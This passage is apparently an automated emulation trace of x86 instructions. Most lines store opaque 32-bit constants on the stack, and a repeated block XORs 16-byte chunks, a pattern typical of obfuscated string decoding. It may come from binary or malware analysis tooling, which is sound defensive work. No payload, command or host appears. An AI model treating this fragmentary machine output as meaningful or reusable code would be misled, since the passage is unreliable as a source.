for stack size 0x10000 saving data to stack: 1467083008 4 0x4042dd: mov dword ptr [esp + 0x11ec], 0xdf827869, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x91ec for stack size 0x10000 saving data to stack: 3749869673 4 0x4042e8: mov dword ptr [esp + 0x11f0], 0xabeb0155, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x91f0 for stack size 0x10000 saving data to stack: 2884305237 4 0x4042f3: mov dword ptr [esp + 0x11f4], 0x4ff19c42, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x91f4 for stack size 0x10000 saving data to stack: 1341234242 4 0x4042fe: mov dword ptr [esp + 0x11f8], 0x256212c2, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x91f8 for stack size 0x10000 saving data to stack: 627184322 4 0x404309: mov dword ptr [esp + 0x11fc], 0xfddb0fbf, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x91fc for stack size 0x10000 saving data to stack: 4258992063 4 0x404314: mov dword ptr [esp + 0x1200], 0xebcf32f7, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9200 for stack size 0x10000 saving data to stack: 3956224759 4 0x40431f: mov dword ptr [esp + 0x1204], 0xe1403fa8, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9204 for stack size 0x10000 saving data to stack: 3779084200 4 0x40432a: mov dword ptr [esp + 0x1208], 0xecb26e94, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9208 for stack size 0x10000 saving data to stack: 3971116692 4 0x404335: mov dword ptr [esp + 0x120c], 0xfea1d155, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x920c for stack size 0x10000 saving data to stack: 4272017749 4 0x404340: mov dword ptr [esp + 0x1210], 0x27516b49, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9210 for stack size 0x10000 saving data to stack: 659647305 4 0x40434b: mov dword ptr [esp + 0x1214], 0x30d68dde, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9214 for stack size 0x10000 saving data to stack: 819367390 4 0x404356: mov dword ptr [esp + 0x1218], 0xd840caa6, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9218 for stack size 0x10000 saving data to stack: 3628124838 4 0x404361: mov dword ptr [esp + 0x121c], 0x114319bb, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x921c for stack size 0x10000 saving data to stack: 289610171 4 0x40436c: mov dword ptr [esp + 0x1220], 0xd9341d9b, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9220 for stack size 0x10000 saving data to stack: 3644071323 4 0x404377: mov dword ptr [esp + 0x1224], 0x1ec762e4, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9224 for stack size 0x10000 saving data to stack: 516383460 4 0x404382: mov dword ptr [esp + 0x1228], 0x40526fc8, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9228 for stack size 0x10000 saving data to stack: 1079144392 4 0x40438d: mov dword ptr [esp + 0x122c], 0xd56d32a1, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x922c for stack size 0x10000 saving data to stack: 3580703393 4 0x404398: mov dword ptr [esp + 0x1230], 0xfea5601d, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9230 for stack size 0x10000 saving data to stack: 4272250909 4 0x4043a3: mov dword ptr [esp + 0x1234], 0x4ca5379a, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9234 for stack size 0x10000 saving data to stack: 1285896090 4 0x4043ae: mov dword ptr [esp + 0x1238], 0x9139574a, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9238 for stack size 0x10000 saving data to stack: 2436454218 4 0x4043b9: mov dword ptr [esp + 0x123c], 0xa6cce157, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x923c for stack size 0x10000 saving data to stack: 2798444887 4 0x4043c4: mov dword ptr [esp + 0x1240], 0x9ce65b5f, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9240 for stack size 0x10000 saving data to stack: 2632342367 4 0x4043cf: mov dword ptr [esp + 0x1244], 0xb6d82820, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9244 for stack size 0x10000 saving data to stack: 3067619360 4 0x4043da: mov dword ptr [esp + 0x1248], 0x4442dffc, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9248 for stack size 0x10000 saving data to stack: 1145233404 4 0x4043e5: mov dword ptr [esp + 0x124c], 0xc2ef33ad, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x924c for stack size 0x10000 saving data to stack: 3270456237 4 0x4043f0: mov dword ptr [esp + 0x1250], 0xf64399d1, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9250 for stack size 0x10000 saving data to stack: 4131625425 4 0x4043fb: mov dword ptr [esp + 0x1254], 0xab2b2f56, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9254 for stack size 0x10000 saving data to stack: 2871734102 4 0x404406: mov dword ptr [esp + 0x1258], 0x56a47e8e, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9258 for stack size 0x10000 saving data to stack: 1453620878 4 0x404411: mov dword ptr [esp + 0x125c], 0x1fbb1553, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x925c for stack size 0x10000 saving data to stack: 532354387 4 0x40441c: mov dword ptr [esp + 0x1260], 0xbd1a4603, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9260 for stack size 0x10000 saving data to stack: 3172615683 4 0x404427: mov dword ptr [esp + 0x1264], 0x8441eadc, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9264 for stack size 0x10000 saving data to stack: 2218912476 4 0x404432: mov dword ptr [esp + 0x1268], 0x6eed8410, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9268 for stack size 0x10000 saving data to stack: 1861059600 4 0x40443d: mov dword ptr [esp + 0x126c], 0xee498199, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x926c for stack size 0x10000 saving data to stack: 3997794713 4 0x404448: mov dword ptr [esp + 0x1270], 0x22697fe5, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9270 for stack size 0x10000 saving data to stack: 577339365 4 0x404453: mov dword ptr [esp + 0x1274], 0xe6aeb072, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9274 for stack size 0x10000 saving data to stack: 3870208114 4 0x40445e: mov dword ptr [esp + 0x1278], 0x78b169d2, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9278 for stack size 0x10000 saving data to stack: 2024892882 4 0x404469: mov dword ptr [esp + 0x127c], 0xbddd90ef, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x927c for stack size 0x10000 saving data to stack: 3185414383 4 0x404474: mov dword ptr [esp + 0x1280], 0x93f3d507, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9280 for stack size 0x10000 saving data to stack: 2482230535 4 0x40447f: mov dword ptr [esp + 0x1284], 0xbf76acd8, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9284 for stack size 0x10000 saving data to stack: 3212225752 4 0x40448a: mov dword ptr [esp + 0x1288], 0xb56066a4, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9288 for stack size 0x10000 saving data to stack: 3042993828 4 0x404495: mov dword ptr [esp + 0x128c], 0xb0110785, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x928c for stack size 0x10000 saving data to stack: 2953906053 4 0x4044a0: mov dword ptr [esp + 0x1290], 0x4321c159, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9290 for stack size 0x10000 saving data to stack: 1126285657 4 0x4044ab: mov dword ptr [esp + 0x1294], 0x264dbb8e, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9294 for stack size 0x10000 saving data to stack: 642628494 4 0x4044b6: mov dword ptr [esp + 0x1298], 0xf4280736, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9298 for stack size 0x10000 saving data to stack: 4096263990 4 0x4044c1: mov dword ptr [esp + 0x129c], 0xef7986eb, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x929c for stack size 0x10000 saving data to stack: 4017719019 4 0x4044cc: mov dword ptr [esp + 0x12a0], 0x25d73aab, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x92a0 for stack size 0x10000 saving data to stack: 634862251 4 0x4044d7: mov dword ptr [esp + 0x12a4], 0x7a4b1794, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x92a4 for stack size 0x10000 saving data to stack: 2051741588 4 0x4044e2: mov dword ptr [esp + 0x12a8], 0xb0628658, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x92a8 for stack size 0x10000 saving data to stack: 2959246936 4 0x4044ed: mov dword ptr [esp + 0x12ac], 0xcaa1f8d1, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x92ac for stack size 0x10000 saving data to stack: 3399612625 4 0x4044f8: mov dword ptr [esp + 0x12b0], 0xfc839fad, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x92b0 for stack size 0x10000 saving data to stack: 4236484525 4 0x404503: mov dword ptr [esp + 0x12b4], 0xa352504a, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x92b4 for stack size 0x10000 saving data to stack: 2740080714 4 0x40450e: mov dword ptr [esp + 0x12b8], 0x9570235a, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x92b8 for stack size 0x10000 saving data to stack: 2507154266 4 0x404519: mov dword ptr [esp + 0x12bc], 0xbb40bf87, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x92bc for stack size 0x10000 saving data to stack: 3141582727 4 0x404524: mov dword ptr [esp + 0x12c0], 0x7a73e2ef, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x92c0 for stack size 0x10000 saving data to stack: 2054415087 4 0x40452f: mov dword ptr [esp + 0x12c4], 0x6a498250, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x92c4 for stack size 0x10000 saving data to stack: 1783202384 4 0x40453a: mov dword ptr [esp + 0x12c8], 0x5dd3898c, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x92c8 for stack size 0x10000 saving data to stack: 1574144396 4 0x404545: mov dword ptr [esp + 0x12cc], 0x199c4c5d, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x92cc for stack size 0x10000 saving data to stack: 429673565 4 0x404550: mov dword ptr [esp + 0x12d0], 0x5bf2b861, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x92d0 for stack size 0x10000 saving data to stack: 1542633569 4 0x40455b: mov dword ptr [esp + 0x12d4], 0xbf9f0d86, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x92d4 for stack size 0x10000 saving data to stack: 3214871942 4 0x404566: mov dword ptr [esp + 0x12d8], 0x1662e69e, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x92d8 for stack size 0x10000 saving data to stack: 375580318 4 0x404571: movaps xmm1, xmmword ptr [esp], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8000 for stack size 0x10000 0x404575: pxor xmm1, xmmword ptr [esp + 0x1330], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9330 for stack size 0x10000 0x40457e: movaps xmmword ptr [esp + 0x1330], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9330 for stack size 0x10000 saving data to stack: 0 16 0x404586: movaps xmm1, xmmword ptr [esp + 0x1340], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9340 for stack size 0x10000 0x40458e: pxor xmm1, xmmword ptr [esp + 0x10], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8010 for stack size 0x10000 0x404594: movaps xmmword ptr [esp + 0x1340], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9340 for stack size 0x10000 saving data to stack: 0 16 0x40459c: movaps xmm1, xmmword ptr [esp + 0x1350], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9350 for stack size 0x10000 0x4045a4: pxor xmm1, xmmword ptr [esp + 0x20], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8020 for stack size 0x10000 0x4045aa: movaps xmmword ptr [esp + 0x1350], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9350 for stack size 0x10000 saving data to stack: 0 16 0x4045b2: movaps xmm1, xmmword ptr [esp + 0x1360], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9360 for stack size 0x10000 0x4045ba: pxor xmm1, xmmword ptr [esp + 0x30], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8030 for stack size 0x10000 0x4045c0: movaps xmmword ptr [esp + 0x1360], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9360 for stack size 0x10000 saving data to stack: 0 16 0x4045c8: movaps xmm1, xmmword ptr [esp + 0x1370], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9370 for stack size 0x10000 0x4045d0: pxor xmm1, xmmword ptr [esp + 0x40], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8040 for stack size 0x10000 0x4045d6: movaps xmmword ptr [esp + 0x1370], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9370 for stack size 0x10000 saving data to stack: 0 16 0x4045de: movaps xmm1, xmmword ptr [esp + 0x1380], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9380 for stack size 0x10000 0x4045e6: pxor xmm1, xmmword ptr [esp + 0x50], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8050 for stack size 0x10000 0x4045ec: movaps xmmword ptr [esp + 0x1380], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9380 for stack size 0x10000 saving data to stack: 0 16 0x4045f4: movaps xmm1, xmmword ptr [esp + 0x1390], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9390 for stack size 0x10000 0x4045fc: pxor xmm1, xmmword ptr [esp + 0x60], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8060 for stack size 0x10000 0x404602: movaps xmmword ptr [esp + 0x1390], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9390 for stack size 0x10000 saving data to stack: 0 16 0x40460a: movaps xmm1, xmmword ptr [esp + 0x13a0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x93a0 for stack size 0x10000 0x404612: pxor xmm1, xmmword ptr [esp + 0x70], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8070 for stack size 0x10000 0x404618: movaps xmmword ptr [esp + 0x13a0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x93a0 for stack size 0x10000 saving data to stack: 0 16 0x404620: movaps xmm1, xmmword ptr [esp + 0x13b0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x93b0 for stack size 0x10000 0x404628: pxor xmm1, xmmword ptr [esp + 0x80], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8080 for stack size 0x10000 0x404631: movaps xmmword ptr [esp + 0x13b0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x93b0 for stack size 0x10000 saving data to stack: 0 16 0x404639: movaps xmm1, xmmword ptr [esp + 0x13c0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x93c0 for stack size 0x10000 0x404641: pxor xmm1, xmmword ptr [esp + 0x90], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8090 for stack size 0x10000 0x40464a: movaps xmmword ptr [esp + 0x13c0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x93c0 for stack size 0x10000 saving data to stack: 0 16 0x404652: movaps xmm1, xmmword ptr [esp + 0x13d0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x93d0 for stack size 0x10000 0x40465a: pxor xmm1, xmmword ptr [esp + 0xa0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x80a0 for stack size 0x10000 0x404663: movaps xmmword ptr [esp + 0x13d0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x93d0 for stack size 0x10000 saving data to stack: 0 16 0x40466b: movaps xmm1, xmmword ptr [esp + 0x13e0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x93e0 for stack size 0x10000 0x404673: pxor xmm1, xmmword ptr [esp + 0xb0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x80b0 for stack size 0x10000 0x40467c: movaps xmmword ptr [esp + 0x13e0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x93e0 for stack size 0x10000 saving data to stack: 0 16 0x404684: movaps xmm1, xmmword ptr [esp + 0x13f0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x93f0 for stack size 0x10000 0x40468c: pxor xmm1, xmmword ptr [esp + 0xc0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x80c0 for stack size 0x10000 0x404695: movaps xmmword ptr [esp + 0x13f0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x93f0 for stack size 0x10000 saving data to stack: 0 16 0x40469d: movaps xmm1, xmmword ptr [esp + 0x1400], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9400 for stack size 0x10000 0x4046a5: pxor xmm1, xmmword ptr [esp + 0xd0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x80d0 for stack size 0x10000 0x4046ae: movaps xmmword ptr [esp + 0x1400], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9400 for stack size 0x10000 saving data to stack: 0 16 0x4046b6: movaps xmm1, xmmword ptr [esp + 0x1410], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9410 for stack size 0x10000 0x4046be: pxor xmm1, xmmword ptr [esp + 0xe0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x80e0 for stack size 0x10000 0x4046c7: movaps xmmword ptr [esp + 0x1410], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9410 for stack size 0x10000 saving data to stack: 0 16 0x4046cf: movaps xmm1, xmmword ptr [esp + 0x1420], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9420 for stack size 0x10000 0x4046d7: pxor xmm1, xmmword ptr [esp + 0xf0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x80f0 for stack size 0x10000 0x4046e0: movaps xmmword ptr [esp + 0x1420], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9420 for stack size 0x10000 saving data to stack: 0 16 0x4046e8: movaps xmm1, xmmword ptr [esp + 0x1430], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9430 for stack size 0x10000 0x4046f0: pxor xmm1, xmmword ptr [esp + 0x100], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8100 for stack size 0x10000 0x4046f9: movaps xmmword ptr [esp + 0x1430], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9430 for stack size 0x10000 saving data to stack: 0 16 0x404701: movaps xmm1, xmmword ptr [esp + 0x1440], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9440 for stack size 0x10000 0x404709: pxor xmm1, xmmword ptr [esp + 0x110], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8110 for stack size 0x10000 0x404712: movaps xmmword ptr [esp + 0x1440], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9440 for stack size 0x10000 saving data to stack: 0 16 0x40471a: movaps xmm1, xmmword ptr [esp + 0x1450], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9450 for stack size 0x10000 0x404722: pxor xmm1, xmmword ptr [esp + 0x120], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8120 for stack size 0x10000 0x40472b: movaps xmmword ptr [esp + 0x1450], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9450 for stack size 0x10000 saving data to stack: 0 16 0x404733: movaps xmm1, xmmword ptr [esp + 0x1460], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9460 for stack size 0x10000 0x40473b: pxor xmm1, xmmword ptr [esp + 0x130], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8130 for stack size 0x10000 0x404744: mov dword ptr [esp + 0x12dc], 0x2aa44683, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x92dc for stack size 0x10000 saving data to stack: 715409027 4 0x40474f: mov dword ptr [esp + 0x12e0], 0x78202f13, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x92e0 for stack size 0x10000 saving data to stack: 2015375123 4 0x40475a: mov dword ptr [esp + 0x12e4], 0x2db2c98c, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x92e4 for stack size 0x10000 saving data to stack: 766691724 4 0x404765: mov dword ptr [esp + 0x12e8], 0xd97147a0, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x92e8 for stack size 0x10000 saving data to stack: 3648079776 4 0x404770: mov dword ptr [esp + 0x12ec], 0x63f34ac9, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x92ec for stack size 0x10000 saving data to stack: 1676888777 4 0x40477b: mov dword ptr [esp + 0x12f0], 0x34e1cff5, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x92f0 for stack size 0x10000 saving data to stack: 887214069 4 0x404786: mov dword ptr [esp + 0x12f4], 0x95f33f22, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x92f4 for stack size 0x10000 saving data to stack: 2515746594 4 0x404791: mov dword ptr [esp + 0x12f8], 0xb83d3662, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x92f8 for stack size 0x10000 saving data to stack: 3091019362 4 0x40479c: mov dword ptr [esp + 0x12fc], 0xc8c6c21f, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x92fc for stack size 0x10000 saving data to stack: 3368469023 4 0x4047a7: mov dword ptr [esp + 0x1300], 0xe4c4d397, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9300 for stack size 0x10000 saving data to stack: 3838104471 4 0x4047b2: mov dword ptr [esp + 0x1304], 0xb4ab7308, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9304 for stack size 0x10000 saving data to stack: 3031134984 4 0x4047bd: mov dword ptr [esp + 0x1308], 0xb13d52b4, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9308 for stack size 0x10000 saving data to stack: 2973586100 4 0x4047c8: mov dword ptr [esp + 0x130c], 0x74c799b5, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x930c for stack size 0x10000 saving data to stack: 1959238069 4 0x4047d3: mov dword ptr [esp + 0x1310], 0xe7699e69, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9310 for stack size 0x10000 saving data to stack: 3882458729 4 0x4047de: mov dword ptr [esp + 0x1314], 0xa00fe3e, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9314 for stack size 0x10000 saving data to stack: 167837246 4 0x4047e9: mov dword ptr [esp + 0x1318], 0x2458c0c6, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9318 for stack size 0x10000 saving data to stack: 609796294 4 0x4047f4: mov dword ptr [esp + 0x131c], 0x41b4f61b, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x931c for stack size 0x10000 saving data to stack: 1102378523 4 0x4047ff: mov dword ptr [esp + 0x1320], 0x9c2c25bb, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9320 for stack size 0x10000 saving data to stack: 2620138939 4 0x40480a: mov dword ptr [esp + 0x1324], 0xd0f83044, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9324 for stack size 0x10000 saving data to stack: 3505926212 4 0x404815: mov dword ptr [esp + 0x1328], 0xbbd139e8, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9328 for stack size 0x10000 saving data to stack: 3151051240 4 0x404820: mov dword ptr [esp + 0x132c], 0x8f588b01, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x932c for stack size 0x10000 saving data to stack: 2404944641 4 0x40482b: movaps xmmword ptr [esp + 0x1460], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9460 for stack size 0x10000 saving data to stack: 0 16 0x404833: movaps xmm1, xmmword ptr [esp + 0x1470], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9470 for stack size 0x10000 0x40483b: pxor xmm1, xmmword ptr [esp + 0x140], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8140 for stack size 0x10000 0x404844: movaps xmmword ptr [esp + 0x1470], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9470 for stack size 0x10000 saving data to stack: 0 16 0x40484c: movaps xmm1, xmmword ptr [esp + 0x1480], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9480 for stack size 0x10000 0x404854: pxor xmm1, xmmword ptr [esp + 0x150], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8150 for stack size 0x10000 0x40485d: movaps xmmword ptr [esp + 0x1480], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9480 for stack size 0x10000 saving data to stack: 0 16 0x404865: movaps xmm1, xmmword ptr [esp + 0x1490], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9490 for stack size 0x10000 0x40486d: pxor xmm1, xmmword ptr [esp + 0x160], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8160 for stack size 0x10000 0x404876: movaps xmmword ptr [esp + 0x1490], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9490 for stack size 0x10000 saving data to stack: 0 16 0x40487e: movaps xmm1, xmmword ptr [esp + 0x14a0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x94a0 for stack size 0x10000 0x404886: pxor xmm1, xmmword ptr [esp + 0x170], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8170 for stack size 0x10000 0x40488f: movaps xmmword ptr [esp + 0x14a0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x94a0 for stack size 0x10000 saving data to stack: 0 16 0x404897: movaps xmm1, xmmword ptr [esp + 0x14b0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x94b0 for stack size 0x10000 0x40489f: pxor xmm1, xmmword ptr [esp + 0x180], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8180 for stack size 0x10000 0x4048a8: movaps xmmword ptr [esp + 0x14b0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x94b0 for stack size 0x10000 saving data to stack: 0 16 0x4048b0: movaps xmm1, xmmword ptr [esp + 0x14c0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x94c0 for stack size 0x10000 0x4048b8: pxor xmm1, xmmword ptr [esp + 0x190], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8190 for stack size 0x10000 0x4048c1: movaps xmmword ptr [esp + 0x14c0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x94c0 for stack size 0x10000 saving data to stack: 0 16 0x4048c9: movaps xmm1, xmmword ptr [esp + 0x14d0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x94d0 for stack size 0x10000 0x4048d1: pxor xmm1, xmmword ptr [esp + 0x1a0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x81a0 for stack size 0x10000 0x4048da: movaps xmmword ptr [esp + 0x14d0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x94d0 for stack size 0x10000 saving data to stack: 0 16 0x4048e2: movaps xmm1, xmmword ptr [esp + 0x14e0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x94e0 for stack size 0x10000 0x4048ea: pxor xmm1, xmmword ptr [esp + 0x1b0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x81b0 for stack size 0x10000 0x4048f3: movaps xmmword ptr [esp + 0x14e0], xmm1, regs_read: [30, 